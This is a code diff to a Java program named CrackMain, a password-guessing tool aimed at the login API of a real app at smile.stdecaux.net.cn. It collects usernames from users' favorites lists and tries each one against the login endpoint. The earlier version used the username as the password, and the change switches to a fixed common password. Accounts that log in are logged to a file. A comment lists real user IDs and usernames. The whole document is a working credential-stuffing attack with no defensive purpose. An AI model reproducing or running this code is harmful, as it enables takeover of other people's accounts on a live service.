@@ -14,18 +14,25 @@ import net.lqm.util.ReadFileUtil;
 public class CrackMain {
 	public static void main(String[] args) {
 		//排除项
-		List<String> l1 = ReadFileUtil.readTxtFile("D:\\Documents\\we\\psw.txt", false);
+//		List<String> l1 = ReadFileUtil.readTxtFile("D:\\Documents\\we\\psw.txt", false);
 		
 		//61066=michlie;61271=柠檬爸爸;61010=wangjunling3
-		for(String userId : getFavoriteUsers("61066")) {
-			String name = getUserName(userId);
+		for(String userId : getFavoriteUsers("61030")) {
+			try {
+				String name = getUserName(userId);
 //			ReadFileUtil.writeTxtFile("D:\\Documents\\we\\my.txt", name);
-			String str = loginWeApp(name);
-			if(str!=null) {
+				String str = loginWeApp(name);
+			if(("dieengfei8").equals(str)) {
+				break;
+			}
+				if(str!=null) {
 //				if(!l1.contains(str)){
-					System.out.println(str);
-					ReadFileUtil.writeTxtFile("D:\\Documents\\we\\copy.txt", str);
+						System.out.println(str);
+						ReadFileUtil.writeTxtFile("D:\\Documents\\we\\copy_plus.txt", str);
 //				}
+				}
+			} catch (Exception e) {
+				e.printStackTrace();
 			}
 		}
 	}
@@ -61,7 +68,7 @@ public class CrackMain {
 	
 	private static String loginWeApp(String user) {
 		String url = "http://smile.stdecaux.net.cn/stdecaux/api/user/login";
-		String param = "{\"parameters\":{\"version\":\"1.3.0\",\"username\":\"" + user + "\",\"password\":\""+user+"\"}}";
+		String param = "{\"parameters\":{\"version\":\"1.3.0\",\"username\":\"" + user + "\",\"password\":\""+"qqq123456"+"\"}}";
 
 		String res = HttpUtils.sendPost(url, param);
 
